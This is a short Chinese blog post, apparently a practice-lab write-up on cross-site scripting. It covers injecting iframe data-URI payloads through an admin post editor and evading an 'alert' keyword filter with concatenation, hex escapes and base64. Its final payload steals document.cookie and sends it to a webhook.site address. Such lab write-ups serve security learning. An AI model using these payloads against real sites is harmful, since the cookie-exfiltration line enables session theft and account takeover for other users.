---
title: 好靶场XSS-2
published: 2026-09-21 11:14
description: XSS，iframe标签的利用以及过滤的绕过
tags:
  - XSS
  - 靶场
category: 网络安全
draft: false
---

xss如今利用条件比较难，而且危害性也一般，所以只选几个靶场玩玩
# 实战-博客某处存在XSS

漏洞利用点：在后台发表文章处，其他位置经测试都被waf拦截

```
<iframe 以及 data:text/html;base64
```

iframe标签的几种格式：

```
<iframe src="/admin">
<iframe src="javascript:">
<iframe src="data:text/html,hello">
<iframe srcdoc="">
<iframe src="data:text/plain;base64">
<iframe src="data:image/png;base64">
<iframe src="data:application/pdf;base64">
<iframe src="data:application/octet-stream;base64">
<iframe src="data:image/svg+xml;base64">
<iframe src="data:text/html;base64">
```

该靶场为存储型xss，且漏洞利用比较难，只有在后台发布文章时，可以使用`<iframe src="data:text/html;base64">`作为内容实现注入

# 欧呦？你过滤了alert？

动态拼接字符或者编码形式

```
// 随便哪种形式都可以，标签未过滤，只有关键词alert被过滤
['a'+'lert']
```

```
<img src=x onerror=eval('al\x65rt(1)')>
```

```
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

```
<img src=x onerror="new Image().src='https://webhook.site/xxx?c='+window['doc'+'ument']['cook'+'ie']">
```